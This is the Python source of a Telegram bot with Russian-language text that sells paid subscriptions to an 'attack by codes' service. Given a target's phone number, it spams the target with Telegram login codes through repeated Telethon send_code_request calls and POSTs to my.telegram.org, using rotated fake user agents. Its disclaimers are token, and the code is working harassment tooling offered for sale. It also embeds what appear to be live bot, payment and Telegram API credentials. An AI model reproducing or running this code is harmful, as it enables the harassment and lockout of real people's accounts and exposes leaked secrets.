import telebot
from telebot import types
import requests
import fake_useragent
import json
import datetime
import time
import sqlite3
import threading
import logging
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import phonenumbers
from cryptobot import Api

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = '8265400671:AAEwAYxUdNGpOMPfHeqslx2K9U4mwYxieDg'
CRYPTOBOT_TOKEN = '505975:AAWB2WYvz4wJuseOm4nrs875jo4ORUJl7ww'
ADMIN_ID = 7037764178  # Замените на ваш ID

# Конфигурация Telethon
API_ID = 30147101  # Замените на ваш API_ID
API_HASH = '72c394e899371cf4f9f9253233cbf18f'  # Замените на ваш API_HASH

# Цены подписок (в USD)
PRICES = {
    '7days': 1.0,
    '30days': 8.0,
    'forever': 25.0
}

bot = telebot.TeleBot(BOT_TOKEN)
crypto_api = Api(CRYPTOBOT_TOKEN)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== БАЗА ДАННЫХ ====================
def init_database():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            join_date TEXT,
            subscription_end TEXT,
            requests_count INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            invoice_id TEXT PRIMARY KEY,
            user_id INTEGER,
            amount REAL,
            status TEXT,
            subscription_type TEXT,
            created_at TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_phone TEXT,
            timestamp TEXT,
            status TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT OR IGNORE INTO users 
        (user_id, username, first_name, join_date, subscription_end)
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, 
          datetime.datetime.now().isoformat(), 
          datetime.datetime.now().isoformat()))
    
    conn.commit()
    conn.close()

def check_subscription(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT subscription_end FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result or not result[0]:
        return False
    
    end_date = datetime.datetime.fromisoformat(result[0])
    return end_date > datetime.datetime.now()

def update_subscription(user_id, subscription_type):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    if subscription_type == 'forever':
        end_date = '2100-01-01'
    elif subscription_type == '30days':
        end_date = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
    else:  # 7days
        end_date = (datetime.datetime.now() + datetime.timedelta(days=7)).isoformat()
    
    cursor.execute('''
        UPDATE users SET subscription_end = ? WHERE user_id = ?
    ''', (end_date, user_id))
    
    conn.commit()
    conn.close()

# ==================== CRYPTOBOT ОПЛАТА ====================
def create_invoice(user_id, amount, subscription_type):
    try:
        invoice = crypto_api.createInvoice(
            asset='USDT',
            amount=amount,
            description=f"Подписка {subscription_type} на атаку кодами"
        )
        
        if invoice.get('ok'):
            # Сохраняем в базу
            conn = sqlite3.connect('users.db')
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO payments (invoice_id, user_id, amount, status, subscription_type, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (invoice['result']['invoice_id'], user_id, amount, 'pending', subscription_type, 
                  datetime.datetime.now().isoformat()))
            conn.commit()
            conn.close()
            
            return {
                'success': True,
                'pay_url': invoice['result']['pay_url'],
                'invoice_id': invoice['result']['invoice_id']
            }
    except Exception as e:
        logger.error(f"Ошибка создания инвойса: {e}")
    
    return {'success': False}

def check_invoice_status(invoice_id):
    try:
        invoices = crypto_api.getInvoices(invoice_ids=invoice_id)
        if invoices.get('ok') and invoices['result']['items']:
            status = invoices['result']['items'][0]['status']
            return status
    except Exception as e:
        logger.error(f"Ошибка проверки инвойса: {e}")
    
    return None

# ==================== РЕАЛЬНАЯ АТАКА КОДАМИ ====================
async def send_code_request(phone_number):
    """Отправляет запрос на код через Telethon"""
    try:
        client = TelegramClient(f'session_{int(time.time())}', API_ID, API_HASH)
        await client.connect()
        
        # Отправляем запрос на код
        sent = await client.send_code_request(phone_number)
        
        await client.disconnect()
        return True
    except Exception as e:
        logger.error(f"Ошибка отправки кода: {e}")
        return False

async def spam_codes_async(phone_number, count=10):
    """Многократная отправка кодов через Telethon"""
    tasks = []
    for i in range(count):
        tasks.append(send_code_request(phone_number))
        await asyncio.sleep(0.5)  # Задержка между запросами
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if r is True)
    return success_count

def spam_codes(phone_number):
    """Синхронная обертка для асинхронной функции"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(spam_codes_async(phone_number, count=15))
        return result
    finally:
        loop.close()

def spam_attack_advanced(phone_number):
    """Усовершенствованная спам-атака из вашего кода + Telethon"""
    user_agent = fake_useragent.UserAgent().random
    headers = {'User-Agent': user_agent}
    
    urls = [
        ('https://my.telegram.org/auth/send_password', {'phone': phone_number}),
        ('https://my.telegram.org/auth/send_password', {'phone': phone_number}),
        ('https://my.telegram.org/auth/send_password', {'phone': phone_number}),
    ]
    
    success_count = 0
    
    # Запускаем обычные HTTP запросы
    for url, data in urls:
        try:
            response = requests.post(url, headers=headers, data=data, timeout=5)
            if response.status_code == 200:
                success_count += 1
            logger.info(f"Запрос к {url}: {response.status_code}")
        except Exception as e:
            logger.error(f"Ошибка запроса: {e}")
    
    # Запускаем атаку кодами через Telethon
    telethon_success = spam_codes(phone_number)
    success_count += telethon_success
    
    return success_count

# ==================== ИНТЕРФЕЙС БОТА ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    add_user(user_id, username, first_name)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('🎯 Атаковать')
    btn2 = types.KeyboardButton('💰 Подписка')
    btn3 = types.KeyboardButton('📊 Статистика')
    btn4 = types.KeyboardButton('ℹ️ Помощь')
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(
        message.chat.id,
        "🔫 *АТАКА КОДАМИ | СНОСЕР СЕССИЙ ТГ*\n\n"
        "Бот для отправки спам-кодов на указанный номер\n"
        "Используйте только в тестовых целях!\n\n"
        "*Доступные команды:*",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: message.text == '🎯 Атаковать')
def start_attack(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        bot.send_message(
            message.chat.id,
            "❌ *Нет активной подписки!*\n\n"
            "Для использования бота необходимо приобрести подписку.\n"
            "Нажмите '💰 Подписка' для выбора тарифа.",
            parse_mode="Markdown"
        )
        return
    
    bot.send_message(
        message.chat.id,
        "📱 *Введите номер телефона для атаки:*\n\n"
        "Формат: +79991234567\n"
        "Пример: +79123456789\n\n"
        "❗️ *Внимание:* Атака может привести к блокировке номера!",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    phone = message.text.strip()
    
    try:
        # Проверяем номер телефона
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            bot.send_message(
                message.chat.id,
                "❌ *Неверный номер телефона!*\n"
                "Убедитесь, что номер в международном формате.",
                parse_mode="Markdown"
            )
            return
    except:
        bot.send_message(
            message.chat.id,
            "❌ *Неверный формат!*\n"
            "Используйте формат: +79991234567",
            parse_mode="Markdown"
        )
        return
    
    # Записываем атаку в базу
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO attacks (user_id, target_phone, timestamp, status)
        VALUES (?, ?, ?, ?)
    ''', (message.from_user.id, phone, datetime.datetime.now().isoformat(), 'started'))
    conn.commit()
    
    # Увеличиваем счетчик запросов
    cursor.execute('''
        UPDATE users SET requests_count = requests_count + 1 
        WHERE user_id = ?
    ''', (message.from_user.id,))
    conn.commit()
    conn.close()
    
    # Отправляем подтверждение
    markup = types.InlineKeyboardMarkup()
    confirm_btn = types.InlineKeyboardButton('✅ Начать атаку', callback_data=f'attack_{phone}')
    cancel_btn = types.InlineKeyboardButton('❌ Отмена', callback_data='cancel_attack')
    markup.add(confirm_btn, cancel_btn)
    
    bot.send_message(
        message.chat.id,
        f"🎯 *Подтверждение атаки*\n\n"
        f"📱 Номер цели: `{phone}`\n"
        f"👤 Ваш ID: `{message.from_user.id}`\n\n"
        f"⚠️ *Будет выполнено:*\n"
        f"• 15+ запросов кодов в Telegram\n"
        f"• Множественные HTTP запросы\n"
        f"• Спам через разные методы\n\n"
        f"*Вы уверены?*",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: message.text == '💰 Подписка')
def show_subscriptions(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn1 = types.InlineKeyboardButton(
        '7 дней - 1$', 
        callback_data='buy_7days'
    )
    btn2 = types.InlineKeyboardButton(
        '30 дней - 8$', 
        callback_data='buy_30days'
    )
    btn3 = types.InlineKeyboardButton(
        'НАВСЕГДА - 25$', 
        callback_data='buy_forever'
    )
    
    markup.add(btn1, btn2, btn3)
    
    user_id = message.from_user.id
    status = "✅ Активна" if check_subscription(user_id) else "❌ Неактивна"
    
    bot.send_message(
        message.chat.id,
        f"💰 *ВЫБОР ПОДПИСКИ*\n\n"
        f"📊 Ваш статус: {status}\n\n"
        f"*Тарифы:*\n"
        f"├ 7 дней — 1$\n"
        f"├ 30 дней — 8$\n"
        f"└ НАВСЕГДА — 25$\n\n"
        f"*Оплата через CryptoBot (USDT)*\n"
        f"Выберите тариф:",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: message.text == '📊 Статистика')
def show_stats(message):
    user_id = message.from_user.id
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT requests_count, subscription_end FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        requests_count, sub_end = result
        active = check_subscription(user_id)
        
        if active:
            status = "✅ Активна"
            end_date = datetime.datetime.fromisoformat(sub_end).strftime("%d.%m.%Y")
        else:
            status = "❌ Неактивна"
            end_date = "Нет подписки"
        
        # Считаем атаки
        cursor.execute('SELECT COUNT(*) FROM attacks WHERE user_id = ?', (user_id,))
        attacks_count = cursor.fetchone()[0]
        
        bot.send_message(
            message.chat.id,
            f"📊 *ВАША СТАТИСТИКА*\n\n"
            f"👤 Пользователь: @{message.from_user.username or 'Нет'}\n"
            f"🆔 ID: `{user_id}`\n"
            f"🎯 Атак выполнено: {attacks_count}\n"
            f"📞 Запросов отправлено: {requests_count}\n"
            f"📅 Подписка: {status}\n"
            f"📆 Действует до: {end_date}",
            parse_mode="Markdown"
        )
    
    conn.close()

@bot.message_handler(func=lambda message: message.text == 'ℹ️ Помощь')
def show_help(message):
    bot.send_message(
        message.chat.id,
        "ℹ️ *ПОМОЩЬ*\n\n"
        "*Как работает бот:*\n"
        "1. Покупаете подписку через CryptoBot\n"
        "2. Вводите номер телефона жертвы\n"
        "3. Бот отправляет множество запросов на код\n"
        "4. На номер приходят SMS с кодами\n\n"
        "*Важно:*\n"
        "• Используйте только в образовательных целях\n"
        "• Не атакуйте номера без разрешения\n"
        "• Атака может привести к блокировке номера\n\n"
        "*Поддержка:* @support",
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    # Покупка подписки
    if call.data.startswith('buy_'):
        subscription_type = call.data[4:]  # 7days, 30days, forever
        amount = PRICES[subscription_type]
        
        # Создаем инвойс
        invoice = create_invoice(user_id, amount, subscription_type)
        
        if invoice['success']:
            markup = types.InlineKeyboardMarkup()
            pay_btn = types.InlineKeyboardButton('💳 Оплатить', url=invoice['pay_url'])
            check_btn = types.InlineKeyboardButton('✅ Проверить оплату', 
                                                   callback_data=f'check_{invoice["invoice_id"]}')
            markup.add(pay_btn, check_btn)
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"💰 *СЧЕТ ДЛЯ ОПЛАТЫ*\n\n"
                     f"Сумма: *{amount}$*\n"
                     f"Тариф: *{subscription_type}*\n"
                     f"ID: `{invoice['invoice_id']}`\n\n"
                     f"*Инструкция:*\n"
                     f"1. Нажмите 'Оплатить'\n"
                     f"2. Оплатите через CryptoBot\n"
                     f"3. Нажмите 'Проверить оплату'\n\n"
                     f"*Оплата в USDT через Telegram*",
                parse_mode="Markdown",
                reply_markup=markup
            )
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка создания счета", show_alert=True)
    
    # Проверка оплаты
    elif call.data.startswith('check_'):
        invoice_id = call.data[6:]
        
        # Проверяем статус
        status = check_invoice_status(invoice_id)
        
        if status == 'paid':
            # Находим тип подписки
            conn = sqlite3.connect('users.db')
            cursor = conn.cursor()
            cursor.execute('SELECT subscription_type FROM payments WHERE invoice_id = ?', (invoice_id,))
            result = cursor.fetchone()
            
            if result:
                subscription_type = result[0]
                update_subscription(user_id, subscription_type)
                
                # Обновляем статус платежа
                cursor.execute('UPDATE payments SET status = ? WHERE invoice_id = ?', ('paid', invoice_id))
                conn.commit()
                conn.close()
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text="✅ *ОПЛАТА ПОДТВЕРЖДЕНА!*\n\n"
                         "Подписка успешно активирована!\n"
                         "Теперь вы можете использовать бота.",
                    parse_mode="Markdown"
                )
            else:
                bot.answer_callback_query(call.id, "❌ Платеж не найден", show_alert=True)
        elif status == 'active':
            bot.answer_callback_query(call.id, "⏳ Ожидаем оплату...", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "❌ Оплата не получена", show_alert=True)
    
    # Начало атаки
    elif call.data.startswith('attack_'):
        phone = call.data[7:]  # Извлекаем номер из callback_data
        
        # Обновляем сообщение
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"⚡️ *ЗАПУСК АТАКИ...*\n\n"
                 f"📱 Цель: `{phone}`\n"
                 f"⏳ Статус: *Подготовка*",
            parse_mode="Markdown"
        )
        
        # Запускаем атаку в отдельном потоке
        def run_attack():
            try:
                # Обновляем статус в базе
                conn = sqlite3.connect('users.db')
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE attacks SET status = 'in_progress' 
                    WHERE user_id = ? AND target_phone = ? 
                    ORDER BY timestamp DESC LIMIT 1
                ''', (user_id, phone))
                conn.commit()
                
                # Запускаем атаку
                success_count = spam_attack_advanced(phone)
                
                # Обновляем статус
                cursor.execute('''
                    UPDATE attacks SET status = 'completed' 
                    WHERE user_id = ? AND target_phone = ? 
                    ORDER BY timestamp DESC LIMIT 1
                ''', (user_id, phone))
                conn.commit()
                conn.close()
                
                # Отправляем результат
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"✅ *АТАКА ЗАВЕРШЕНА*\n\n"
                         f"📱 Номер: `{phone}`\n"
                         f"📊 Успешных запросов: *{success_count}*\n"
                         f"⏱ Время: {datetime.datetime.now().strftime('%H:%M:%S')}\n\n"
                         f"🎯 *Цель атакована успешно!*",
                    parse_mode="Markdown"
                )
                
            except Exception as e:
                logger.error(f"Ошибка атаки: {e}")
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"❌ *ОШИБКА АТАКИ*\n\n"
                         f"Произошла ошибка: {str(e)[:100]}",
                    parse_mode="Markdown"
                )
        
        thread = threading.Thread(target=run_attack)
        thread.start()
    
    # Отмена атаки
    elif call.data == 'cancel_attack':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="❌ *АТАКА ОТМЕНЕНА*",
            parse_mode="Markdown"
        )

# ==================== АДМИН КОМАНДЫ ====================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton('📊 Статистика', callback_data='admin_stats')
    btn2 = types.InlineKeyboardButton('👤 Пользователи', callback_data='admin_users')
    btn3 = types.InlineKeyboardButton('📈 Финансы', callback_data='admin_finance')
    markup.add(btn1, btn2, btn3)
    
    bot.send_message(
        message.chat.id,
        "⚙️ *АДМИН ПАНЕЛЬ*",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    if call.data == 'admin_stats':
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM attacks')
        total_attacks = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM payments WHERE status = "paid"')
        total_payments = cursor.fetchone()[0]
        
        conn.close()
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"📊 *СТАТИСТИКА БОТА*\n\n"
                 f"👥 Пользователей: {total_users}\n"
                 f"🎯 Атак выполнено: {total_attacks}\n"
                 f"💰 Оплаченных подписок: {total_payments}\n"
                 f"⏰ Бот онлайн",
            parse_mode="Markdown"
        )

# ==================== ЗАПУСК БОТА ====================
def payment_checker():
    """Поток для проверки платежей"""
    while True:
        try:
            conn = sqlite3.connect('users.db')
            cursor = conn.cursor()
            
            # Находим ожидающие платежи
            cursor.execute('SELECT invoice_id, user_id, subscription_type FROM payments WHERE status = "pending"')
            pending = cursor.fetchall()
            
            for invoice_id, user_id, subscription_type in pending:
                status = check_invoice_status(invoice_id)
                
                if status == 'paid':
                    # Активируем подписку
                    update_subscription(user_id, subscription_type)
                    cursor.execute('UPDATE payments SET status = ? WHERE invoice_id = ?', ('paid', invoice_id))
                    
                    # Уведомляем пользователя
                    try:
                        bot.send_message(
                            user_id,
                            "✅ *ОПЛАТА ПОДТВЕРЖДЕНА!*\n\n"
                            "Ваша подписка активирована.\n"
                            "Теперь вы можете использовать бота.",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
                    
                    logger.info(f"Подписка активирована для пользователя {user_id}")
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Ошибка проверки платежей: {e}")
        
        time.sleep(60)  # Проверяем каждую минуту

if __name__ == '__main__':
    # Инициализация базы данных
    init_database()
    logger.info("База данных инициализирована")
    
    # Запускаем проверку платежей в отдельном потоке
    checker_thread = threading.Thread(target=payment_checker, daemon=True)
    checker_thread.start()
    logger.info("Проверка платежей запущена")
    
    # Запускаем бота
    logger.info("Бот запускается...")
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        logger.error(f"Ошибка бота: {e}")